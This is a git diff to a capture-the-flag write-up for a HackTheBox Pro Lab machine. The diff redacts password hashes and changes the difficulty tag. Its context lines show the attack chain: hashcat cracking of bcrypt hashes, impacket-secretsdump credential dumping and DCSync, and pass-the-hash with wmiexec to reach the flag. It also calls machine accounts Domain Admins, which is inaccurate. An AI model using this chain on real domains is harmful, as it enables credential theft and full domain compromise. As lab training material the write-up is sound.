@@ -7,7 +7,7 @@ pwned: true
 tags:
   - boxes
   - os/linux
-  - diff/insane
+  - diff/hard
   - type/prolab
 category:
   - HTB
@@ -132,18 +132,18 @@ mysql -u darkzero -p[REDACTED] darkzero_campaigns \
 
 ```
 username  password_hash
-admin     $2b$10$...
-josh      $2b$10$[HASH_REDACTED]
+admin     [HASH_REDACTED]
+josh      [HASH_REDACTED]
 ```
 
-Josh's hash is a bcrypt `$2b$10$`. Run it through hashcat:
+Josh's hash is bcrypt. Run it through hashcat:
 
 ```bash
 hashcat -m 3200 josh.hash /usr/share/wordlists/rockyou.txt
 ```
 
 ```
-$2b$10$[HASH_REDACTED]:[CRACKED]
+[HASH_REDACTED]:[CRACKED]
 ```
 
 ## SSH as Josh
@@ -341,7 +341,7 @@ Route is live. Both DCs are now reachable directly:
 On SRV01 under `/root/` there's a MySQL backup file: `darkzero_campaigns_backup.sql`. It contains a `backup_users` table with an entry for `celia`:
 
 ```sql
-INSERT INTO backup_users VALUES ('celia','celia.morgan@darkzero.ext','$2b$10$...');
+INSERT INTO backup_users VALUES ('celia','celia.morgan@darkzero.ext','[HASH_REDACTED]');
 ```
 
 Same bcrypt, same wordlist:
@@ -368,7 +368,7 @@ impacket-secretsdump DARKZERO.EXT/celia:[REDACTED]@172.16.20.2 -just-dc-user krb
 
 ```
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...:::
+krbtgt:502:[LM_HASH]:...:::
 [*] Kerberos keys grabbed
 krbtgt:aes256-cts-hmac-sha1-96:[AES256_REDACTED]
 ```
@@ -536,8 +536,8 @@ impacket-secretsdump \
 ```
 [*] Target system bootKey: 0x...
 [*] Dumping local SAM hashes
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:...:::
-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<DC01_MACHINE_NT>:::
+Administrator:500:[LM_HASH]:...:::
+DC01$:1000:[LM_HASH]:<DC01_MACHINE_NT>:::
 ```
 
 We want `DC01$` — the machine account. Machine accounts are Domain Admins in their own domain and can DCSync.
@@ -547,19 +547,19 @@ We want `DC01$` — the machine account. Machine accounts are Domain Admins in t
 ```bash
 impacket-secretsdump \
   "darkzero.htb/DC01\$@172.16.20.1" \
-  -hashes "aad3b435b51404eeaad3b435b51404ee:<DC01_MACHINE_NT>" \
+  -hashes "[LM_HASH]:<DC01_MACHINE_NT>" \
   -just-dc-user Administrator
 ```
 
 ```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NT>:::
+Administrator:500:[LM_HASH]:<ADMIN_NT>:::
 ```
 
 ## root.txt
 
 ```bash
 impacket-wmiexec \
-  -hashes "aad3b435b51404eeaad3b435b51404ee:<ADMIN_NT>" \
+  -hashes "[LM_HASH]:<ADMIN_NT>" \
   administrator@172.16.20.1 \
   "type C:\Users\Administrator\Desktop\root.txt"
 ```
